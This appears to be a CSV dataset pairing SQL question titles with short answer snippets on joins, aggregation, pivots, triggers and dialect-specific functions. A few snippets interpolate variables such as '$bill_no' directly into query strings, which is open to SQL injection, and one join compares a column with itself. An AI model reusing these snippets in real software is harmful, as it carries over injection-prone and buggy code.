25773,52675,Getting unique tuples in SQL," select distinct least(from_st, to_st), greatest(from_st, to_st), fare
 from your table;
"
10872,40050,sql copy data in column from one row to all others,"DECLARE @updatevalue <yourcolumndatatype>
SELECT @updatevalue = updatecolumn
FROM yourtable
WHERE uniquecolumn = uniqueidentifier

UPDATE yourtable
SET updatecolumn = @updatevalue
WHERE uniquecolumn <> uniqueidentifier 
"
13528,31944,Remove select fields from Group BY,"select MessageId, SearchedString, COUNT(SearchedString) AS [SearchedStringCount], MAX(percentage) AS TopPercent, max(CAST(ScreenedDate AS DATE))       AS DateScreened
from (
select MessageId, SearchedString, Percentage, ScreenedDate
from  table
where MessageId = '15'
) T
GROUP BY MessageId, SearchedString
"
2418,742,Update record with count as a condition,"    update phone set IsValid=0 where id in
    (select id  from phone
    where id not in (
    select MAX(id)id
    from phone 
    group by phoneNo))
    and IsValid=1
"
36127,49405,SQL - Select only one value from multiple fields,"SELECT LTRIM(RTRIM(col1 + col2 + col3 + col4))
"
39757,65666,How to write any UDF getting value according any index gap?,"create function GetValueUDF
(
  @string varchar(max), 
  @startPosition int,
  @length int
)
returns varchar(max)
as

begin
  return substring(@string, @startPosition, @length)
end
"
26811,66855,SQL script to create insert script,"Select COALESCE(Name, '') from...
"
37178,49731,Union Query not displaying records for second query,"select case when len(GroupName) = 0 then 'Unknown' else GroupName end as GroupName,
    PaperId,
    Color,
    Duplex, 
    sum(Page_Printed) As A3PagesPrinted, 
    sum(Cost) as A3TotalCost,
    NULL AS A3DuplexPagesPrinted,
    NULL AS A3DuplexTotalCost
from printstat where paperid = 8 and color = 0 and duplex = 0 
and Date_Print >= '2013-01-01' and Date_Print < '2013-10-21'
group by GroupName, PaperId, Color, Duplex

union all

select case when len(GroupName) = 0 then 'Unknown' else GroupName end as GroupName,
    PaperId,
    Color,
    Duplex,
    NULL,
    NULL,
    sum(Page_Printed) As A3DuplexPagesPrinted, 
    sum(Cost) as A3DuplexTotalCost
from printstat where paperid = 8 and color = 0 
and duplex = 1 and Date_Print >= '2013-01-01' and Date_Print < '2013-10-21'
group by GroupName, PaperId, Color, Duplex
"
10672,48819,timestamp is not getting converted in mysql,"select FROM_UNIXTIME(sentDate/1000) from Table A;
"
11260,28742,Joining 2 mysql table and ordering by number of same rows in 1 table,"SELECT  a.photo_url, COUNT(b.photo_ID) totalVotes
FROM    table1 a
        LEFT JOIN table2 b
            ON a.photo_ID = b.photo_id
GROUP BY a.photo_url
ORDER BY totalVotes DESC
"
5532,57636,Parallelizing SQL queries in R,"system.time(
  outputPar <- foreach(i = 1:2, .packages=""RODBC"")%dopar%{
#Connecting to database through RODBC
  ch=odbcConnect(dsn ,pwd = ""xxxxxx"", believeNRows=FALSE)
#Test connection
  odbcGetInfo(ch)
  result<-sqlQuery(ch,paste('SELECT * FROM ',databases[i]))   
  result
}
)
"
30707,50405,Zend_Db join query,"$id_array = array(""1"",""2"");

$subQuery = $this->select()
    ->from(array('b' => 'brands'), array('b.brand_id','b.brand_name'))
    ->where('b.brand_id NOT in (?)', $id_array)
    ->order('RAND()')
    ->limit(5);
$query = $this->select()
    ->from(array('b' => $subQuery), array('*'))
    ->join(array('p' => 'product'), 'b.brand_id = p.brand_id', array('p.product_id', 'p.product_price'))
    ->join(array('pimg' => 'product_img_map'), 'p.product_id = pimg.product_id', array('pimg.img_location'));
"
15873,32019,Issue related to not Equal to (<>) in SQL Server,"declare @previouspulse int = 0
declare @previousox int = 0
declare @Pulse int = 0
declare @SpO2 int = 0

set @previouspulse = null  
set @Pulse= 121
set @previousox = 56 
set @SpO2 = null

IF isnull(@previouspulse,0) <> isnull(@Pulse,0) or isnull(@previousox,0) <> isnull(@SpO2,0)
    select -1
else
    select -2
"
25682,18508,MySQL Optimize query to Enhance Performance for Comparison Report,"SELECT 
   t1.id,
   t1.dateTime,
   t1.phone,
   t1.address 
FROM 
   tempUsers t1 
LEFT OUTER JOIN
   users t2
ON
   t1.id = t2.id 
   AND t1.dateTime=t2.dateTime
WHERE
   t2.id IS NULL
"
38340,55524,"How can I get all records from one table, even if there are no corresponding records in the JOINed table?","SELECT uID, Name, aID, aDate, aText
FROM [Users]
LEFT JOIN [Activity] ON uID = UserID
AND (aDate >= '2013-10-14')
AND (aDate <= '2013-10-18')
WHERE uSalesRep = 1
"
16012,37833,Complex SQL query to join two tables,"select a.id, a.name, a.city, b.attr_value
from table_A a left join
     table_B b
     on a.id = b.attr_id and b.attr_name = 'Attr_1' and b.attr_type = 'TableA';
"
37379,18514,joined UPDATE/INSERT in CI active records,"$this->db->set('tbl1.column2', 'value1');
$this->db->set('tbl2.column3', 'value2');
$this->db->where('tbl1.column1', 1);
$this->db->update('tbl1 JOIN tbl2 ON tbl1.id = tbl2.tbl1_id');
"
25304,45912,How can I run this UPDATE query faster?,"UPDATE WEB 
SET WEB.ID_D_SUPPORT = DIM.ID_D_SUPPORT 
FROM dbo.F_SUPPORT_WEB WEB
INNER JOIN dbo.D_SUPPORT DIM ON WEB.id_support = DIM.id_support 
   AND (WEB.date_creation BETWEEN DIM.Date_Deb_Valid AND DIM.Date_Fin_Valid)
WHERE WEB.ID_D_SUPPORT <> DIM.ID_D_SUPPORT 
"
25246,42148,Prevent delete on single row with trigger,"CREATE TRIGGER deleteWorkspace ON Workspaces
FOR DELETE AS

IF(SELECT COUNT(*) FROM deleted) = 1
BEGIN
RAISERROR('Single Delete Not Allowed!', 16, 1)
ROLLBACK
END
ELSE
RAISERROR('Multiple Rows Being Deleted, Allowed!', 16, 1)
BEGIN
END

END
GO
"
16436,70592,MySQL check id whether is in another table,"SELECT table1.*
FROM table1
    LEFT JOIN table2
        ON table1.id = table2.tableone_id
WHERE table2.tableone_id IS NULL
"
27358,49571,convert varchar field data in date format in oracle,"where created_dte >= '2014-07-21' and created_dte < '2014-08-05'
"
1782,15487,Columns to include in nonclustered index,"CREATE NONCLUSTERED INDEX MyIndex ON MyTable(Col1, Col2, Col3, Col4, Col5, Col6)
INCLUDE (Col7, Col8, Col9, Col10)
"
15956,36076,SQL new daily table based on range of dates,"SELECT allEvents.totalCount AS C,
  ev.EventID,
  CAST(c.Date AS Date) AS date,
  ev.sysname  
FROM complete_ev ev
RIGHT JOIN calendar c ON c.Date BETWEEN ev.Start AND ev.End
INNER JOIN (SELECT COUNT(EventID) AS totalCount, EventID FROM complete_ev GROUP BY EventID) AS allEvents ON ev.EventID = allEvents.eventID
WHERE ev.type = 's' 
  AND ev.EventID = 6881;
"
34908,49265,Check data existance before inserting to table,"INSERT  INTO Queue ( ID )
        SELECT  DISTINCT I.ID -- as to avoid same ID being inserted multiple times
        FROM    Inventory I
        JOIN    inserted
          ON    inserted.pID = I.pID
        WHERE   NOT EXISTS ( SELECT *
                               FROM Queue Q
                              WHERE Q.ID = I.ID )
"
10633,54574,Is it possible to rename a joined column during an inner join?,"select d.Name as DogName, o.Name
from Dog d
inner join Owner o on d.OwnerID = o.OwnerID
"
17812,14518,"Set # of attempts according to Completed Date - Postgres SQL, Database","select u.*, 
row_number() over(partition by userid,course order by enrollmentdate,completeddate) as attempts
from ""User_Result"" u
"
7216,10681,SQL group partitioned result set,"SELECT column1 column2 column3 column4,
ROW_NUMBER()OVER(PARTITION BY column1 column2 column3 column4 ORDER BY (SELECT 1)) as row_num,
DENSE_RANK()OVER(ORDER BY column1 column2 column3 column4) as [group]
FROM yourtable
"
8583,59298,How i can avoid the distinct() of watchdog?,"    // query without distingc
//  print_r($results); print out array of results to see what field to take as unique

      $already_processed = array();

  foreach ($result as $row) {
    $unique_value = $row['some_unique_field'];
    if (in_array($unique_value, $already_processed)) continue;
    $already_processed[] = $unique_value;
    blablabla($row);
  }
"
25804,9592,Join with alternating possibilities,"SELECT      I.ItemId
        ,   S.Price
        ,   S.Qty
        ,   S.Company
FROM        dbo.Item    I
CROSS APPLY (
                SELECT  MIN(Price)  Price
                FROM    dbo.Sku     MP
                WHERE   I.ItemId    = MP.ItemId
                AND     Qty         > 0
            ) MP
CROSS APPLY (
                SELECT 
                TOP 1   Price
                    ,   Qty
                    ,   Company
                FROM    dbo.Sku     S
                WHERE   S.ItemId    = I.ItemId
                AND     S.Price     = MP.Price
            ) S
"
27560,43811,Oracle text search on multiple tables and joins,"-- Crating the view
CREATE MATERIALIZED VIEW fulltext_helper
NOLOGGING
BUILD DEFERRED
REFRESH COMPLETE ON DEMAND
AS
SELECT 
   a.dob, -- we don't need to fulltext on him
   XMLELEMENT(helper,
     XMLFOREST(a.emp_no AS emp_no, 
              a.dept_no AS dept_no, 
              b.emp_name AS emp_name)
   ) AS indexme
FROM v_depts a 
LEFT OUTER JOIN employee_details b
ON (a.emp_no = b.emp_no);

-- Creating the index
BEGIN
    ctx_ddl.create_preference('fulltext_helper_lexer', 'BASIC_LEXER');
    ctx_ddl.create_preference('fulltext_helper_filter', 'NULL_FILTER');
END;
/
CREATE INDEX fulltext_helper_index ON fulltext_helper (indexme)
INDEXTYPE IS CTXSYS.CONTEXT PARAMETERS (
    'DATASTORE CTXSYS.DIRECT_DATASTORE
     LEXER fulltext_helper_lexer
     FILTER fulltext_helper_filter');

-- Searching the whole data
SELECT * FROM fulltext_helper
WHERE contains(indexme, '{abc} INPATH (/helper)') > 0;

-- Searching only on ""empno""
SELECT * FROM fulltext_helper
WHERE contains(indexme, '{abc} INPATH (/helper/emp_no)') > 0;
"
27216,14457,How to find the last row in a column with duplicate values,"select t.* 
from 
(
    select userid, max(rownumber) m 
    from table
    group by userid
) c
    inner join table t
         on c.userid = t.userid and c.m = t.rownumber
"
24146,73051,How to update a value in a table to MAX of other rows?,"update @Content 
set LastCommentOn =  
(select MAX(CreatedOn) from @Content c where c.ParentId = m.Id) 
from @Content m
where ParentId is null and LastCommentOn = '2001-12-01'
"
19410,35554,Limit number of character after certain character,"round(1424124.991412, 2);
"
16775,16299,SQL ORACLE: How to replace a character by its HEX value,"select replace ('test'||chr(150)||'text',chr(to_number( '96', 'xx' )), '') from dual;

 testtext 
"
33669,25438,Symfony2 querybuilder truncate with foreign key and alter table,"public function postRemove(LifecycleEventArgs $args)
{
    $entity = $args->getEntity();

    $em = $args->getEntityManager();
    $qb = $em->getRepository(get_class($entity))->createQueryBuilder('e');

    $id = $qb->select('COALESCE(MAX(e.id)+1, 1)')->getQuery()->getSingleScalarResult();
    $table = $em->getClassMetadata(get_class($entity))->getTableName();

    $sql = sprintf(""ALTER TABLE %s AUTO_INCREMENT = %d"", $table, $id);
    $em->getConnection()->prepare($sql)->execute();

}
"
21566,46006,SQL Count non existing item with two column,"SELECT  a.owner, b.status,
        COUNT(g.status) TotalCount
FROM    (SELECT DISTINCT OWNER FROM groups) a
        CROSS JOIN
        (
            SELECT  'NOK' `status` UNION ALL
            SELECT  'OK' `status` UNION ALL
            SELECT  'PENDING' `status` UNION ALL
            SELECT  'REJECTED' `status` 
        ) b
        LEFT JOIN groups g
            ON  a.owner = g.owner
                AND b.status = g.status
GROUP   BY a.owner, b.status
ORDER   BY a.owner, b.status
"
5768,56385,How do you create a new user with admin permissions in ADS?,"--Create User
EXECUTE PROCEDURE sp_CreateUser('username', 'password', 'comment');

--Add the user to the DB:Admin group
EXECUTE PROCEDURE sp_AddUserToGroup('username','DB:Admin'); 
"
39583,70852,MySQL join two columns on a single column,"SELECT  a.ID,
        a.bill_no,
        a.container_type,
        b.port_name AS Origin_name,
        c.port_name AS Destination_name
FROM    user_tracking a
        INNER JOIN sea_ports b
            ON a.origin_id = b.id
        INNER JOIN sea_ports c
            ON a.destination_id = c.id
WHERE   a.bill_number = '$bill_no'
"
31060,53217,optimise and merge sql queries into one - newbie alert,"SELECT m.username,
    (
        SELECT SUM(liter) AS SumOfLiters
        FROM diesel
        WHERE diesel.dato >= '$dx'
        AND diesel.IDField = d.IDField
    ) AS TotalFuel
FROM members m
    JOIN diesel d ON d.userid = m.id
WHERE d.dato >= '$dx'
"
36873,19077,Retrieving the last filtered record in each group,"SELECT m.*, t1.* FROM mood m 
LEFT JOIN temper t1 ON ( m._id = t1.mood_id AND t1.status_id !=1) 
LEFT JOIN temper t2 ON ( t1.mood_id = t2.mood_id AND t1._id < t2._id AND t2.status_id !=1 ) 
WHERE t2._id IS NULL 
AND m.grantee_username = ""username"" 
AND m.status_id != 1; // NOT INTERESTED IN THIS FILTER
"
529,57628,How to show only the id of one table and not to duplicate with other tables?,"SELECT R.id, B.name AS branch_name, C.name AS company_name, PD.product_name AS product_name, PD.Desc AS description, R.start_date
FROM Report R
LEFT JOIN report_details RD ON R.id = R.id
LEFT JOIN products P ON RD.product_id = P.id
LEFT JOIN product_details PD ON PD.product_id = PD.id
LEFT JOIN branches B ON R.branch = B.id
LEFT JOIN companies C ON R.comp_id = C.id
GROUP BY R.id, B.name, C.name, PD.product_name, PD.Desc, R.start_date
"
24591,22646,Use CASE condition as result value,"NULLIF(GREATEST(IFNULL(f1, -1), IFNULL(f2, -1)), -1)
"
6716,69140,SQL ABS() is returning unexpected decimal when applied on divisible data,"declare @real real = 1.5, @realup money=3
select @realUp numerator, @real denominator, @realup /cast (@real as money) money, @realup /cast(@real as decimal) decimal

--numerator denominator money   decimal
--3.00      1.5         2.00    1.50000000000000000000000
"
18826,73509,Pending friend request query for friends table and grabbing data from other tables,"SELECT u.name_surname, 
       u.avatar,
       GROUP_CONCAT(DISTINCT w.word Order by w.word asc) AS words
FROM users u
INNER JOIN 
(
SELECT f1.asker_user_id AS friend_id
    FROM friends AS f1 
    LEFT JOIN friends AS f2
        ON f1.asked_user_id = f2.asker_user_id
        AND f1.asker_user_id = f2.asked_user_id   
    WHERE f1.status = 1 AND f2.status IS NULL
    AND f1.asked_user_id = 2
) a ON a.friend_id = u.id
LEFT JOIN connections c ON u.id = c.user_id
LEFT JOIN words_en w ON w.id = c.word_id
GROUP BY u.id;
"
5926,41924,Finding items in a table that satisfy a subset frequency condition?,"select UserID
from Ownership 
where ItemID in (1,2,3,4,5,...) --your list of ItemIDs
group by UserID
having count(distinct ItemID) >= 3 --the minimum # of distinct items required
"
9675,21281,UPDATE table with SELECT from another but with a field being SUM(someField),"update  your_table as yt
left join 
        (
        select  id
        ,       count(*) as cnt
        from    other_table
        where   period < 4
        group by
                id       
        ) as ot
on      yt.id = ot.id 
set     col1 = coalesce(ot.cnt,0)
"
25562,62729,SQL - Inserting into table with concatenation with condition,"INSERT INTO tableB(rowid, concatCol)
SELECT
    rowid,
    objectIdA + CASE WHEN objectIDB IS NULL THEN '' ELSE '_' + objectIDB END 
FROM
    TableA
"
37097,3869,Trigger to delete from a second MySQL table,"DELIMITER $
CREATE TRIGGER delete_painting AFTER DELETE ON Painting
    DELETE FROM Art WHERE OLD.id_no = Art.id_no; $
"
11443,99,need help for combine sql query,"select a.*, b.*
from customers a, order b
where a.name = b.customer_name
and a.orderdate < 01-09-2010
and b.purchasedate > 01-09-2010
"
18377,6646,MSSQL Find if Column Value has change for same ID,"select t.*
from t outer apply
     (select top 1 t2.*
      from t t2
      where t2.emp_id = t.emp_id and t2.startdate < t.startdate
      order by t2.startdate desc
     ) tprev
where tprev is null or tprev.color <> t.color
"
17302,45020,alternating default value for new field in mysql database,"SELECT (id+1)%3+1 AS given_number, ... FROM ...
"
21761,51729,strtodate mysql function not exsit .. mysql query,"select sum(coalesce(prices.room_price , def.room_price) ) as TotalPrice
from (select str_to_date('2013-05-15' , '%Y-%m-%d') as thedate union all
      select str_to_date('2013-05-08' , '%Y-%m-%d') as thedate
     ) dates left outer join
     SH_rooms_price prices
     on dates.thedate between prices.start_season and prices.end_season and
        dayname(dates.thedate) = prices.day_of_week join SH_rooms_price def
    on def.season_price = 'default' and
       def.id_hotel = 5544 and
       def.day_of_week = dayname(dates.thedate);
"
16746,38641,How to insert 1000 rows at a time,"declare @id int 
select @id = 1
while @id >=1 and @id <= 1000
begin
    insert into student values(@id, 'jack' + convert(varchar(5), @id), 12)
    select @id = @id + 1
end
"
11073,59378,Set timeout length of my query,"> Open SQL Management Studio
> Click Tools > Options
> Expand Query Execution
> Expand SQL Server
> Select General
> Adjust Execution time-out
"
26569,35262,Group by is null or not?,"SELECT  COUNT(MY_TIMESTAMP) AS TOTAL_NOTNULL,
        COUNT(CASE WHEN MY_TIMESTAMP IS NULL THEN 1 END) TOTAL_NULL
FROM    MY_TABLE
"
9038,4115,Maximum size of IN expression SQL Server,"SELECT *
FROM table
Where toto IN (SELECT toto FROM other) 
"
19796,58628,Substring from string oracle,"with t(d) as (
  select 'A-20-1-1' from dual union all
  select 'A-10-10-4' from dual union all
  select 'A-10-11-1' from dual 
)
select REPLACE(SUBSTR(d, INSTR(d, '-', 1, 2) + 1), SUBSTR(d, INSTR(d, '-', 1, 3))) from t

RES
---
  1
 10
 11
"
22421,16424,Dynamic SQL Select Variable Statement,"declare

currMonth number:=12;
plsql_block VARCHAR2(500);

begin
plsql_block:='Select Month'||currMonth -2||'_Values,
                     Month'||curr_month-1||'_Values,
                     Month'||currMonth||'_Values 
              from test_table';

execute immediate plsql_block;
end
"
37656,45890,Optimizing sql condition to apply condition to all dependent rows,"SELECT t.*
FROM task t
WHERE NOT EXISTS (SELECT 1
                  FROM taskdependency d JOIN 
                       task p
                       ON d.parent_task_id = p.id 
                  WHERE t.id = d.task_id AND p.status <> 'SUCCESS'
                 );
"
13470,61350,Writing a LIMIT subquery within my SQL query,"select * from
(select 
@rn:=if(@prv=competitionId  , @rn+1, 1) as rId,
@prv:=competitionId  as competitionId  ,
totalPoints,
your_other_columns
from (select * from ...)subquery
join
(select @prv:=0, @rn:=0)tmp
order by 
competitionId  , totalPoints desc) a
-- only top 2 ordered by points for every competition
where rid<=2

output:
rID  competitionId  compName  start_date  end_date  name  totalPoints
------------------------------------------------------------
 1      123           First Comp   13-09-09  13-10-09  John    100
 2      123           First Comp   13-09-09  13-10-09  Bob     50
 1      431           Second Comp  13-05-04  13-10-05  Sally   500
 2      431           Second Comp  13-05-04  13-10-05  Jessica 50
"
27964,63263,How to achive particular hierarchical query in Oracle,"SQL> WITH DATA AS (
  2     SELECT NULL parentid, 'A188' ID, 'N' allowsEntry FROM dual
  3     UNION ALL SELECT 'A188', '1881', 'Y' FROM dual
  4     UNION ALL SELECT  NULL , 'A189', 'N' FROM dual
  5     UNION ALL SELECT 'A189', '1891', 'Y' FROM dual
  6     UNION ALL SELECT '1891', '189A', 'Y' FROM dual
  7     UNION ALL SELECT '1891', '189B', 'Y' FROM dual
  8  ), leaf_also_nodes AS (
  9     SELECT *
 10       FROM DATA
 11      WHERE allowsEntry = 'Y'
 12        AND ID IN (SELECT parentid FROM DATA)
 13  ), data_plus AS (
 14     SELECT d.parentid,
 15            d.id,
 16            CASE WHEN l.id IS NOT NULL THEN l.id || '_' ELSE d.id
 17            END display_name
 18       FROM DATA d
 19       LEFT JOIN leaf_also_nodes l ON d.id = l.id
 20     UNION ALL
 21     SELECT ID, NULL, ID FROM leaf_also_nodes
 22  )
 23  SELECT rpad(' ', (LEVEL - 1) * 2, ' ') || display_name tree
 24    FROM data_plus
 25   START WITH parentid IS NULL
 26  CONNECT BY (PRIOR ID = parentid);

TREE
-----------------------------------------
A188
  1881
A189
  1891_
    189A
    189B
    1891
"
21603,50887,Deleting duplicates from listed records with SQL in PhpMyAdmin,"DELETE FROM allCity AS c
WHERE exists (select tid 
              from allCity c2
              where c2.name = c.name
                and c2.id < c.id);
"
17829,21259,how to measure selectivity for composite index,"SELECT COUNT(*) / SUM(C) FROM 
  (
    SELECT COL1, COL2, ... COLN, COUNT(*) C
    FROM TABLE
    GROUP BY COL1, COL2, ... COLN
  )
"
19100,41996,"""Invalid column name"" ORDER BY","SELECT TOP 1 TEST 
From (
       SELECT Top 2 
            convert(datetime,column1,101) AS TEST,
            column1         // <- include column1
       FROM  table1 
       ORDER BY column1 DESC
     ) X                   
ORDER BY column1 ASC
"
29418,64322,Get every 100th record starting from the top,"SELECT   no_id AS `start`, no_id - 100 + 1 AS `end`
FROM     my_table
JOIN     (SELECT MAX(no_id) AS max_no_id
          FROM   my_table)
         ON (max_no_id - no_id) % 100 = 0
ORDER BY no_id DESC
"
38487,49530,SQL pivot query data," SELECT *
 FROM (SELECT *
       FROM Test) as test
 PIVOT (
   MAX(ride)
   FOR hour IN ([1], [2], [3], [4], [5], [6])) AS PivotTable
"
23909,12160,DB2 Limit update access to one column in table,"GRANT UPDATE(comments)
ON TABLE my_table
TO USER some_user;
"
10270,65090,"MySql stored procedure, how to insert more than one variable with CONCAT","SET @query := CONCAT(""SELECT *,
sqrt( 
        (POW(a.Latitude - ?, 2)* 68.1 * 68.1) + 
        (POW(a.Longitude - ?, 2) * 53.1 * 53.1) 
 ) AS distance
FROM table1 as r
JOIN table2 as co ON co.field1 = r.field2
JOIN table3 AS a ON r.field1 = a.field2
WHERE "",rid);
PREPARE stmt FROM @query;
EXECUTE stmt USING @lat, @lon;
"
10361,34957,Oracle sequential field validation,"select t.*
from t
where (t.field1 is null and coalesce(t.field2, t.field3, t.field4, t.field5) is not null) or
      (t.field2 is null and coalesce(t.field3, t.field4, t.field5) is not null) or
      (t.field3 is null and coalesce(t.field4, t.field5) is not null) or
      (t.field4 is null and t.field5 is not null);
"
11332,30872,pass R variable to a sql statement in R,"temp <- fn$sqldf(""select count(V1) from file_new where V1=$v "")
"
19172,4443,"Regex to match anything, string, multiple,strings including newline non greedy in VIM","                            *non-greedy*
If a ""-"" appears immediately after the ""{"", then a shortest match
first algorithm is used (see example below).  In particular, ""\{-}"" is
the same as ""*"" but uses the shortest match first algorithm.  BUT: A
match that starts earlier is preferred over a shorter match: ""a\{-}b""
matches ""aaab"" in ""xaaab"".

Example         matches ~
ab\{2,3}c       ""abbc"" or ""abbbc""
a\{5}           ""aaaaa""
ab\{2,}c        ""abbc"", ""abbbc"", ""abbbbc"", etc.
ab\{,3}c        ""ac"", ""abc"", ""abbc"" or ""abbbc""
a[bc]\{3}d      ""abbbd"", ""abbcd"", ""acbcd"", ""acccd"", etc.
a\(bc\)\{1,2}d      ""abcd"" or ""abcbcd""
a[bc]\{-}[cd]       ""abc"" in ""abcd""
a[bc]*[cd]      ""abcd"" in ""abcd""

The } may optionally be preceded with a backslash: \{n,m\}.
"
26936,49189,compounding yearly interest using tsql,"CREATE TABLE #Test (
    Name CHAR(1),
    Rate MONEY,
    Principal MONEY
);

INSERT INTO #Test (Name, Rate, Principal)
VALUES  ('A', 0.5, 10),('B', 0, 10);


WITH Years AS (
 SELECT 1 Year
 UNION ALL 
 SELECT Year+1 FROM Years
 WHERE Year < 5
)
SELECT
     *
       FROM 
    (SELECT 'Year'+CAST(Year AS VARCHAR(1)) Year, 
        Name, 
        Rate, 
        Principal,   
        Principal * POWER((Rate+1), Year) Result
    FROM Years, #Test) A
PIVOT (MAX(RESULT) FOR YEAR IN ([Year1], [Year2], [Year3],[Year4],[Year5])) PVT


Name Rate                  Principal             Year1                 Year2                 Year3                 Year4                 Year5
---- --------------------- --------------------- --------------------- --------------------- --------------------- --------------------- ---------------------
A    0.50                  10.00                 15.00                 22.50                 33.75                 50.625                75.938
B    0.00                  10.00                 10.00                 10.00                 10.00                 10.00                 10.00
"
9743,631,select query to calculate number of occurrence as well as total cost,"SELECT d.descrip, p.purity, count(p.purity) as qty, sum(p.duty)
FROM product p
  INNER JOIN Description d ON p.desc_id = d.id
  LEFT OUTER JOIN packaging_details pg on pg.prod_id = p.id

GROUP BY d.descrip, p.purity
ORDER BY d.descrip desc, p.purity desc
"
5349,15466,How to close sessions (connections) to sql-database (vertica) recursively,"SELECT E'SELECT CLOSE_SESSION(\'' || session_id || E'\');' 
FROM   user_sessions
WHERE  client_hostname LIKE '%.195%';
"
31476,30280,SQL get data from column(YYY0) with same number as different column(XXXX0) with the maximum date,"SELECT id,
CASE
WHEN YYYY0 > YYY1 AND YYY0 > YYY2 ... AND YYY0 > YYY9 THEN XXX0
WHEN YYY1 > YYY2 ... AND YYY0 > YYY9 THEN XXX1
...
ELSE XXX9 AS LabelX,
CASE
WHEN YYYY0 > YYY1 AND YYY0 > YYY2 ... AND YYY0 > YYY9 THEN YYY0
WHEN YYY1 > YYY2 ... AND YYY0 > YYY9 THEN YYY1
...
ELSE YYY9 AS LabelY,
...
"
39896,58136,How to select a count of rows after a specific flag has been set,"select count(*)
from t
where t.date_time > (select max(date_time) from t where isReset = 1);
"
16353,23630,SQL calculation on number of tuples involving a composite primary key,"| a | b |
+---+---+
| 1 | 1 |
| 2 | 1 |
| 3 | 1 |
| 4 | 1 |
| 1 | 2 |
"
31507,66471,How to get multiple inner node values,"SELECT 
    ID, 
    XTbl1.Loc.value('locationName[1]','varchar(200)') as locationName, 
    XTbl2.InCharge.value('.','varchar(200)') AS locationInchargeName 
FROM @Test
CROSS APPLY XmlContent.nodes('location') as XTbl1(Loc)
CROSS APPLY XTbl1.Loc.nodes('locationInchargeName') as XTbl2(InCharge)
"
16571,48269,Combining SQL Server Queries,"SELECT A.*, B.Orders
FROM (  SELECT  [Agent],
                SUM(CASE WHEN [Date_Added] BETWEEN @startDate AND @endDate THEN 1 ELSE 0 END) AS 'New',
                SUM(CASE WHEN [Date_Updated] BETWEEN @startDate AND @endDate THEN 1 ELSE 0 END) AS 'Worked',
                SUM(CASE WHEN [Completed] = 'yes' AND [Date_Updated] BETWEEN @startDate AND @endDate THEN 1 ELSE 0 END) AS 'Completed',
                SUM(CASE WHEN [Failure_Analysis] = 'yes' AND [Date_Updated] BETWEEN @startDate AND @endDate THEN 1 ELSE 0 END) AS 'FA'
        FROM Work 
        GROUP BY [Agent]) A
LEFT JOIN (SELECT   [Agent]
                    SUM(CASE WHEN [Date] BETWEEN @startDate AND @endDate THEN 1 ELSE 0 END) AS 'Orders' 
            FROM Orders 
            GROUP BY [Agent]) B
ON A.[Agent] = B.[Agent]
"
36291,73094,SQL select command,"SELECT e.empno, e.empName, s.empname
FROM eployee AS e
LEFT JOIN eployee AS s ON e.supervisors = s.empno
"
4208,65555,How to set Doctrine 1.2 ATTR_CASCADE_SAVES off in databases.yml?,"public function configureDoctrineConnectionDoctrine(Doctrine_Connection $connection)
{
  $connection->setAttribute('CASCADE_SAVES', false);
}
"
34694,69028,Matching two columns in MySQL,"select A.column1, B.column2 
from tablename as A, tablename as B 
where (A.id != B.id) and (SOUNDEX(A.column1) = SOUNDEX(B.column2))
"
35514,64311,SQL DB2 - Case statement with Y or N for different values with same column,"select columna, 
  name,
  max(case when rel_type = 'FG' then 'Y' else 'N' end) 'FG',
  max(case when rel_type = 'F1' then 'Y' else 'N' end) 'F1',
  max(case when rel_type = 'F2' then 'Y' else 'N' end) 'F2',
  max(case when rel_type = 'F3' then 'Y' else 'N' end) 'F3'
from tablea
group by columna, name
"
29054,23694,How to get top 1 from each group,"select t1.*
from table t1
join
(
  SELECT id, max(datetime) as dt
  FROM Table 
  WHERE id IN (32,33,35,36,37,50,51) 
  GROUP BY id
) t2 on t1.id = t2.id and t1.datetime = t2.dt
ORDER BY t1.datetime
"
18442,71187,How to define a table in SQL with 2 fields being not-null (mandatory) dependent?,"CREATE TRIGGER t BEFORE INSERT ON mytable
FOR EACH ROW BEGIN
    IF COALESCE(NEW.email, NEW.phone_number) IS NULL THEN
        SIGNAL SQLSTATE '45000'
          SET MESSAGE_TEXT = 'Either email or phone_number must be non-null';
    END IF;
END
"
10772,2764,Matching a String having '%' as a character,"select *
  from MyTable
 where Column like 'CT\%CNV!XYZABCD%' escape '\'
"
38023,37948,Using not in SQL query,"SELECT  dbo.Service.Service_ID, 
        dbo.Service.Service_RNO, 
        dbo.Customer.Cust_Name,
        dbo.Service.Agrement_ID,
        dbo.Customer.Cust_ID,
        dbo.Service.Service_Date,
        dbo.Service.Next_Service 
FROM dbo.Service 
INNER JOIN dbo.Customer ON dbo.Service.Cust_ID = dbo.Customer.Cust_ID 
WHERE  Next_Service between '2016-01-01' and '2016-02-01' 
AND    Next_Service not in (
          SELECT Service_Date 
          FROM Service s
          WHERE s.Cust_ID = dbo.Customer.Cust_ID
) 
ORDER BY Next_Service
"
33219,70655,Need help designing ERD for food bank,"Agency   | ZIP   | Date   | FamiliesServed | PeopleServed
Agency A | 12345 | Jan-12 | 100            | 245
Agency A | 12340 | Jan-12 | 20             | 31
Agency B | 12345 | Jan-12 | 80             | 178
Agency B | 12340 | Jan-12 | 0              | 0
"
9453,36589,Rank partition by the same value,"SELECT Pais, Campana, Representante, Actividad
     , row_number() OVER (PARTITION BY Pais, Representante, Actividad, grp
                          ORDER BY Campana) AS rn
FROM  (
   SELECT Pais, Campana, Representante, Actividad
        , row_number() OVER (PARTITION BY Pais, Representante ORDER BY Campana)
       -  row_number() OVER (PARTITION BY Pais, Representante, Actividad
                             ORDER BY Campana) AS grp
   FROM   tbl
   ) sub
ORDER  BY Campana;
"
29799,3587,Editing Multiple Rows by Their Order Index,";WITH TEST AS 
( 
SELECT *,  
       ROW_NUMBER() OVER (ORDER BY id DESC) AS RowNo 
FROM [UserTable]
) 
UPDATE TEST  
SET  myindex = RowNo
"
21200,9206,What's the quickest way with SQL to insert a bunch of rows,"Statement stmt = con.createStatement();

stmt.addBatch(""INSERT INTO employees VALUES (1000, 'Joe Jones')"");
stmt.addBatch(""INSERT INTO departments VALUES (260, 'Shoe')"");
stmt.addBatch(""INSERT INTO emp_dept VALUES (1000, 260)"");

// submit a batch of update commands for execution
int[] updateCounts = stmt.executeBatch();
"
20282,21263,SQL to google map points,"var polyline = new GPolyline(line, ""#ff0000"", 3, 1);
 map.addOverlay(polyline);
"
35852,54142,SQL SUM on DISTINCT values per time,"SELECT
Date,
15Interval 15MinInterval,
Sum(Price) PriceSum
FROM
(SELECT  DISTINCT
OBJECT,
Price,
Date(Moment)  Date,
